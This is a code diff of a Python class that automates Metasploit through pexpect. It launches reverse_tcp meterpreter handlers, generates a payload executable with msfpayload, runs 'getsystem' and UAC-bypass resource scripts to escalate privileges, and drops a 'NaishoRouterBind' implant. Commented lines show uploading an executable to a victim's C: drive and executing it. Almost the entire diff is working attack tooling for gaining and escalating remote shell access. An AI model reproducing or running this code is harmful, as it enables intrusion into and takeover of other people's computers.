@@ -39,10 +39,31 @@ class naishomisc:
 			rhost = ""
 			lport = "8080"
 			
-			child = pexpect.spawn("msfcli %s payload=%s lhost=%s lport=%s E" % (exploit,payload,hostip,hostport))
-			child.sendline ("resource resource/dropNaishoRouterBind.rc")
-			child.interact()	
+			#child = pexpect.spawn("msfcli %s payload=%s lhost=%s lport=%s E" % (exploit,payload,hostip,hostport))
+			child = pexpect.spawn("msfconsole")
+			child.sendline("resource resource/windows_64_listen.rc")
+			child.sendline("background")
+			#child.sendline("resource resource/uac-system.rc")
+			child.sendline("getsystem")
+			child.sendline("resource resource/dropNaishoRouterBind.rc")
+			child.interact()
+			
 
+			#subprocess.Popen("msfconsole", shell=True).wait()
+			subprocess.Popen("msfpayload %s lhost=%s lport=%s X > payloads/payload.exe" % (payload, hostip, lport), shell=True).wait()
+			#subprocess.Popen("msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s" % (exploit,payload,rhost,lport), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
+			#subprocess.Popen("msfcli %s payload=%s lhost=%s lport=%s E" % (exploit,payload,hostip,hostport), shell=True).wait()
+			#raw_input("Wait...")
+			#child.sendline ("resource resource/dropNaishoRouterBind.rc")
+			#child.interact()
+			#time.sleep(10)
+			#child.sendline("upload payloads/NaishoRouterBind.exe c:\\")
+			#time.sleep(4)
+			#child.sendline('getsystem')
+			#time.sleep(4)
+			#child.sendline('execute -f c:\\testing.exe ' + self.hostname + ' -i -H')
+			#time.sleep(4)
+			#child.interact()	
 		elif choice == str(2):
 			exploit = "multi/handler"
 			payload = "linux/x86/meterpreter/reverse_tcp"
@@ -53,4 +74,9 @@ class naishomisc:
 			
 			child = pexpect.spawn("msfcli %s payload=%s lhost=%s lport=%s E" % (exploit,payload,hostip,hostport))
 			child.sendline ("resource resource/demodrop.rc")
+			child.interact()
+		elif choice == str(3):
+			child = pexpect.spawn("msfconsole -r /root/windows_x64_listener.rc")
+			child.sendline ("resource -r resource/demodrop.rc")
+			child.sendline ("resource -r /root/uac-system.rc")
 			child.interact()
